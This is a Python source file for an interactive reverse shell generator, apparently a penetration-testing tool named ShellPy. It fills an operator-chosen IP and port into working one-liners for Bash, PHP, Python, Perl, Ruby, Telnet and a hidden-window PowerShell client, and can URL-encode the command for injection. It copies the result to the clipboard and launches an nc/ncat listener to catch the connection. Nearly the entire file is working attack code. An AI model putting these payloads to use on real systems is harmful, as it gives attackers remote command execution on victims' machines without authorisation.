import ipaddress
import os
import urllib.parse
from string import Template
from typing import List

import readchar
from colorama import Fore, Style
from netifaces import interfaces, ifaddresses, AF_INET
from pyperclip import copy

banner = '''
   _____ __         ________       
  / ___// /_  ___  / / / __ \__  __
  \__ \/ __ \/ _ \/ / / /_/ / / / /
 ___/ / / / /  __/ / / ____/ /_/ / 
/____/_/ /_/\___/_/_/_/    \__, /  
                          /____/   
                          
'''

header = Template(
    '\n' + Style.BRIGHT + '---------- [ ' + Fore.CYAN + '$text' + Fore.RESET + ' ] ----------' + Style.RESET_ALL + '\n'
)
prompt = Template(
    Style.BRIGHT + '[' + Fore.BLUE + ' # ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text : ' + Style.BRIGHT
)
code = Template(Style.BRIGHT + Fore.GREEN + '$code' + Style.RESET_ALL)
success = Template(Style.BRIGHT + '[' + Fore.GREEN + ' + ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text')
info = Template(Style.BRIGHT + '[' + Fore.YELLOW + ' ! ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text')
fail = Template(Style.BRIGHT + '[' + Fore.RED + ' - ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text')

ip = port = shell = command = ''

choices = ['No', 'Yes']
shells = ['/bin/sh', '/bin/bash', '/bin/zsh', '/bin/ksh', '/bin/tcsh', '/bin/dash']
commands = {
    'Bash': "bash -i >& /dev/tcp/$ip/$port 0>&1",
    'PHP': "php -r '$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    'Python': "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    'Perl': "perl -e 'use Socket;$i=\"$ip\";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    'Ruby': "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    'Telnet': "rm -f /tmp/p; mknod /tmp/p p && telnet $ip $port 0/tmp/p",
    'Windows-Powershell': "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
}

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(banner)

def is_valid(ip_address):
    try:
        ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        return False

def exit_program():
    print('\n' + success.safe_substitute(text='Goodbye RootRaj !!'))
    exit(0)

def select(options: List[str], selected_index: int = 0) -> int:
    print('\n' * (len(options) - 1))
    while True:
        print(f'\033[{len(options) + 1}A')
        for i, option in enumerate(options):
            print('\033[K{}{}'.format(
                '\033[1m[\033[32;1m x \033[0;1m]\033[0m ' if i == selected_index else
                '\033[1m[   ]\033[0m ', option))
        keypress = readchar.readkey()
        if keypress == readchar.key.UP:
            selected_index = max(selected_index - 1, 0)
        elif keypress == readchar.key.DOWN:
            selected_index = min(selected_index + 1, len(options) - 1)
        elif keypress == readchar.key.ENTER:
            break
        elif keypress == readchar.key.CTRL_C:
            raise KeyboardInterrupt
    return selected_index

def specify_ip():
    print(header.safe_substitute(text='SELECT IP'))
    options = {}
    for interface in interfaces():
        try:
            ip_address = ifaddresses(interface)[AF_INET][0]['addr']
            if ip_address != '127.0.0.1':
                options[ip_address] = ip_address + ' on ' + interface
        except KeyError:
            pass
    options['manual'] = 'Specify manually'
    ip_choice = list(options.keys())[select(list(options.values()))]
    global ip
    if ip_choice == 'manual':
        while True:
            input_ip = input(prompt.safe_substitute(text='Enter IP address'))
            if is_valid(input_ip):
                ip = input_ip
                break
            else:
                print(fail.safe_substitute(text='Please, specify a valid IP address!'))
    else:
        ip = ip_choice

def specify_port():
    print(header.safe_substitute(text='SPECIFY PORT'))
    while True:
        input_port = input(prompt.safe_substitute(text='Enter port number'))
        if 1 <= int(input_port) <= 65535:
            global port
            port = input_port
            break
        else:
            print(fail.safe_substitute(text='Please, choose a valid port number!'))

def select_command():
    print(header.safe_substitute(text='SELECT COMMAND'))
    global command
    command_keys = list(commands.keys())
    command_name = command_keys[select(command_keys)]
    global command
    command = commands[command_name]

def select_shell():
    print(header.safe_substitute(text='SELECT SHELL'))
    global shell
    shell = shells[select(shells)]

def build_command():
    try:
        command_template = Template(command)
        command_final = command_template.safe_substitute(ip=ip, port=port, shell=shell)
        print(header.safe_substitute(text='URL ENCODE'))
        if select(choices) == 1:
            command_final = urllib.parse.quote_plus(command_final)
            print(info.safe_substitute(text='Command is now URL encoded!'))
        print(header.safe_substitute(text='FINISHED COMMAND'))
        print(code.safe_substitute(code=command_final) + '\n')
        if 'SSH_CLIENT' not in os.environ and 'SSH_TTY' not in os.environ:
            copy(command_final)
            print(info.safe_substitute(text='Reverse shell command copied to clipboard!'))
        print(success.safe_substitute(text='In case you want to upgrade your shell, you can use this:\n'))
        print(code.safe_substitute(code="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"))
    except IOError as e:
        print(fail.safe_substitute(text=f'Failed to read command file: {e}'))

def setup_listener():
    if os.name != 'nt':
        print(header.safe_substitute(text='SETUP LISTENER'))
        if select(choices) == 1:
            os.system(f'$(which ncat || which nc) -nlvp {port}')
        else:
            exit_program()

def main():
    print_banner()
    try:
        specify_ip()
        specify_port()
        select_command()
        select_shell()
        build_command()
        setup_listener()
    except KeyboardInterrupt:
        exit_program()

if __name__ == '__main__':
    main()
